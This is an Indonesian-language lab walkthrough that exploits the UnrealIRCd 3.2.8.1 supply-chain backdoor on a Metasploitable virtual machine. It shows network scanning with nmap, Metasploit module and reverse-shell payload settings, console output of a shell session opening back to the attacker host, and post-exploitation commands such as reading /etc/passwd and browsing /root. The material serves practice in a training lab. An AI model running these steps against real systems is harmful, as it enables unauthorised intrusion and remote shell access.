# Introduction

**IRC** (_Internet Relay Chat_) adalah protokol komunikasi berbasis teks yang memungkinkan pengguna untuk berkomunikasi secara _real-time_ dalam bentuk pesan teks. Protokol ini bekerja dengan model klien-server: Pengguna menggunakan program klien (seperti mIRC, HexChat, atau WeeChat) untuk terhubung ke server IRC. Di dalam server, ada saluran atau "kanal" (channels) yang berfungsi sebagai ruang obrolan untuk topik tertentu.

Dibuat pada tahun 1988, IRC adalah salah satu bentuk komunikasi daring tertua dan masih digunakan hingga saat ini, terutama oleh komunitas programmer, gamer, dan pengguna yang membutuhkan platform komunikasi yang cepat dan minim sumber daya.

**UnrealIRCd** adalah salah satu perangkat lunak server IRC yang paling populer, dikenal karena stabilitas dan fitur-fiturnya yang canggih. Namun, ada satu insiden terkenal yang melibatkan _backdoor_ yang disisipkan di salah satu rilisnya.

Pada tahun 2010, terungkap bahwa rilis resmi dari **UnrealIRCd versi 3.2.8.1** telah disusupi dengan sebuah _backdoor_ oleh pihak yang tidak bertanggung jawab. Kerentanan ini adalah contoh dari serangan rantai pasok (supply-chain attack), di mana kode berbahaya disisipkan ke dalam perangkat lunak sebelum didistribusikan ke publik.

**1. _Reconnaissence_**

- Analisis jaringan yang sedang dipakai untuk mengetahui IP yang digunakan

```
ifconfig
```
- Memindai seluruh jaringan internal yang saling terhubung untuk mencari target
```
nmap -sn <ip_range>

Ex. nmap -sn 192.168.1.0/24   //scanning the whole connected divices
```
**2. _Scanning and Enumeration_**

Memindai port IRC, 6667 pada IP target
```
nmap -p 6667 -sV <ip_metasploitable>
```
Fungsi utama dari opsi **-sV** pada perintah Nmap adalah untuk melakukan deteksi versi layanan (_service version detection_) pada port yang terbuka.
```
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
MAC Address: 08:00:27:68:17:AC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: irc.Metasploitable.LAN
```
**UnrealIRCd** adalah daemon IRC yang terkenal, dan di Metasploitable, versi yang digunakan memiliki kerentanan eksekusi perintah dari jarak jauh yang terkenal.

**3. _Gaining Access (Exploitation)_**
- Menjalankan Metasploit Framework
```
msfconsole
```
- Mencari modul eksploitasi yang sesuai dengan kerentanan yang ditemukan
```
search unrealircd
```

```
Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution

```
Fungsi utama dari modul ini adalah untuk mengotomatisasi proses pengiriman perintah yang memicu backdoor tersebut, sehingga seorang penyerang bisa mendapatkan akses shell dari jarak jauh.

- Memilih dan mengatur eksploitasi
```
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <ip_metasploitable>
set LHOST <ip_kali_linux>
set PAYLOAD cmd/unix/reverse
```
Gunakan payload yang sesuai dengan modul, bisa di check dengan perintah 'show payloads'

- Cek _requirement_, pastikan tidak ada yang kurang atau terlewat
```
show options
```
- Jika sudah lengkap, jalankan serangan
```
exploit
```

```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
[*] Started reverse TCP double handler on 192.168.175.235:4444 
[*] 192.168.175.90:6667 - Connected to 192.168.175.90:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.175.90:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo tO0C7ZfD4jEaZcGb;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "tO0C7ZfD4jEaZcGb\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.175.235:4444 -> 192.168.175.90:40742) at 2025-08-18 09:30:23 -0400


```
**4. _Maintaining accsess dan Post exploitation_**
- Verifikasi user atau akses root
```
whoami
```
- Eksplorasi sistem
```
ls -l                    //melihat list file dan direktory
```
```
uname -a                 //melihat versi kernel dan informasi sistem
```
```
cat /etc/passwd          //melihat daftar user
```
```
cd /root                 //mencari file sensitif
```
